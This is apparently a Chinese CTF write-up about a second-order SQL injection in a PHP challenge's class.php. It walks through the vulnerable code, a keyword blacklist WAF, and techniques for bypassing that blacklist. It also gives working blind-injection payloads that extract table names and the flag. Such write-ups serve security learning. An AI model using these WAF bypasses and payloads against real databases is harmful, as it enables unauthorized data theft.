# 源码审计

在`class.php`中可能存在二次注入

```php
public function add_email($email)
{
    $id = $_SESSION['uid'];
    $sql_query = "SELECT username FROM users where id = '$id'";
    $row = mysqli_query($this->sql, $sql_query);
    $result = $row->fetch_all(MYSQLI_ASSOC);
    $username = $result[0]['username'];
    $email = mysqli_real_escape_string($this->sql, $email);
    $sql_query = "INSERT INTO `email` (`id`, `username`, `email`, `time`) VALUES (NULL,'$username','$email',NOW())";
    $this->sql->query($sql_query);
}

public function list_email()
{
    $id = $_SESSION['uid'];
    $sql_query = "SELECT username FROM users where id = '$id'";
    $row = mysqli_query($this->sql, $sql_query);
    $result = $row->fetch_all(MYSQLI_ASSOC);
    $username = $result[0]['username'];
    $sql_query = "SELECT email,time FROM email where username = '$username'";

    $row = mysqli_query($this->sql, $sql_query);
    $posi = 1;
    echo '<div class="container"><table class="table"><thead><tr><th scope="col">#</th><th scope="col">Email</th><th scope="col">Time</th></tr></thead><tbody>';
    while ($result = $row->fetch_assoc()) {
        echo '<tr><th scope="row">' . $posi++ . '</th><td>' . $result['email'] . '</td><td>' . $result['time'] . '</td></tr>';
    }
    echo '</tbody></table></div>';
}
```

可以看到`add_email`和`list_email`中所使用的`usernane`均来自数据库查询得到的结果,假设在注册时我们注册一个名为`' or 1#`的用户(暂时忽略waf)

在注册过程中,由于存在`mysqli_real_escape_string`,敏感字符会被转义后再执行sql语句,但是从数据库取出`username`后,并没有执行相应的`mysqli_real_escape_string`,因此`SELECT email,time FROM email where username = '$username'`会变成`SELECT email,time FROM email where username = '' or 1#'`因此造成了二次注入

# 绕过waf

```php
public function waf($value): bool
{
    $blackList = array(' ', '^', '#', '*', '/', '-', ';', '!', '~', '<', '>', '?', '=', urldecode('%00'), urldecode('%09'), urldecode('%0A'), urldecode('%0B'), urldecode('%0C'), urldecode('%0D'), urldecode('%A0'), '+', '`', '"', '\\', '()', 'or', 'and', 'between', 'insert', 'update', 'xml', 'delete', 'into', 'union', 'file', 'extractvalue', 'if', 'substr', 'hex', 'bin', 'ord', 'ascii', 'sleep', 'medium');
    foreach ($blackList as $item) {
        if (stripos($value, $item) !== false) {
            return false;
        }
    }
    return true;
}
```

1. 由于过滤了`or`和`and`,因此使用`||`和`&&`代替

2. 因为过滤了`or`,所以`information_schema`用`sys.schema_auto_increment_columns`代替

3. `=`被过滤,使用`like`或者`regexp`代替

4. 空格和空格的其他形式被过滤,使用`()`即`select(flag)`进行代替

5. `#`和`-`被过滤,构造`||'`去闭合最后的`'`

6. `substr`被过滤,可以使用`mid`代替

7. `medium`被过滤,可以使用十六进制`0x6d656469756d`代替

8. `^`被过滤,可使用`$`来从后往前进行匹配

## 查询medium下的表

`xxx'||(mid((select(group_concat(table_name))from(sys.schema_auto_increment_columns)where((table_schema)like(0x6d656469756d))),%d,1)regexp'%s$')||'`

`xxx'||(mid((select(group_concat(table_name))from(sys.schema_auto_increment_columns)where((table_schema)like(0x6d656469756d))),%d,1)like('%s'))||'`

得到`c1c7fbbb74d0d43101a2814ade767362,email,users`

## 查询c1c7fbbb74d0d43101a2814ade767362

题目提示flag在flag列中

`xxx'||(mid((select(flag)from(c1c7fbbb74d0d43101a2814ade767362)),%d,1)regexp'%s$')||'`

`xxx'||(mid((select(flag)from(c1c7fbbb74d0d43101a2814ade767362)),%d,1)like('%s'))||'`

完整脚本见[medium-sql.py](medium-sql.py)